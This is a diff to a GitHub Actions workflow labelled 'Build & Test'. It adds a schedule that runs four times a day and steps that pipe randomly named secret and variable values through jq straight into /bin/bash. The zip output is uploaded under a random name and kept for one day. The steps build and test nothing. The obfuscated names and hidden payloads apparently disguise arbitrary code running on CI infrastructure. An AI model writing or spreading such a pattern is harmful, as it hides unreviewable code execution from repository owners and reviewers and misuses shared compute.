@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,18 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          ezeg416: ${{ secrets.ezeg416 }}
+          lkl70071: ${{ secrets.lkl70071 }}
         run: |
-          printf '%s' "$ezeg416" | jq -r .rnfq361 | /bin/bash
-          echo $kxzps77546 | jq -r .r90 | /bin/bash
-          printf '%s' "$dmfq9" | jq -r .cz84516 | /bin/bash
-          printf '%s' "$t75" | jq -r .wb728 | /bin/bash
-          printf '%s' "$fcqp95" | jq -r .kjd70 | /bin/bash
+          printf '%s' "$lkl70071" | jq -r .h83407 | /bin/bash
+          printf '%s' "$v98" | jq -r .ej445 | /bin/bash
+          printf '%s' "$dxho81610" | jq -r .mjcf1 | /bin/bash
+          printf '%s' "$bw1" | jq -r .w3671 | /bin/bash
+          echo $s93 | jq -r .eh7446 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: LcNOTbYF
+          name: wCtJwXhS
           path: "*.zip"
           retention-days: 1
